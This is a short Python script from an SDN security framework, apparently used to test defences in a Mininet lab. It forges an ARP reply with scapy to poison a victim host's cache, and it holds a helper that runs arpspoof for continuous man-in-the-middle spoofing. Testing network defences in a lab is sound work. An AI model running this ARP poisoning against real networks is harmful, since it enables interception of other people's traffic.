#####################################################################
# Ryuretic: A Modular Framework for RYU                             #
# !/mininet/examples/SecFrameTest/ARP_Poison.py                  #
# Author:                                                           #
#   Jacob Cox (jcox70@gatech.edu)                                   #
# Arp_Poison.py                                                  #
# date 28 April 2016                                                #
#####################################################################
# Copyright (C) 1883 Thomas Edison - All Rights Reserved            #
# You may use, distribute and modify this code under the            #
# terms of the Ryuretic license, provided this work is cited        #
# in the work for which it is used.                                 #
# For latest updates, please visit:                                 #
#                   https://github.gatech.edu/jcox70/SecRevFrame    #
#####################################################################

from scapy.all import *
from uuid import getnode as get_mac
import os
from subprocess import call
import sys
import threading
import signal
import socket
import netifaces

interface = os.listdir('/sys/class/net/')[0]
print interface

mac = open('/sys/class/net/%s/address' % interface).read()
f = os.popen('ifconfig '+interface+' | grep "inet\ addr" | cut -d: -f2 | cut -d" " -f1')
hostip=f.read()

victimIP = '10.0.0.5'
dstIP = '10.0.0.220'
##print hostip
##print interface

# This runs a continual ping
def arpPoisonVictim(interface, victimIP, dstIP):
    #To ARP Spoof the victim
    """http://robospatula.blogspot.com/2013/12/
    man-in-the-middle-attack-arpspoof-sslstrip.html"""
    os.system('arpspoof -i %s -t %s %s' % (interface,victimIP,dstIP))
    #Other option, but spoofs every body. Requires arping install
    """
    os.system('sudo arping -c 3 -A -I eth0 10.0.1.1')
    """

#Send a single packet to test network security feature
poison_target = ARP()
poison_target.op = 2
poison_target.psrc = dstIP
poison_target.pdst = victimIP
poison_target.hwdst = mac

send(poison_target)

#Ref
# http://stackoverflow.com/questions/4258822/mac-ethernet-id-using-python
#arpPoisonVictim(interface, victimIP, dstIP)
#http://bt3gl.github.io/black-hat-python-infinite-possibilities-with-the-scapy-module.html#arp




#must install dsniff
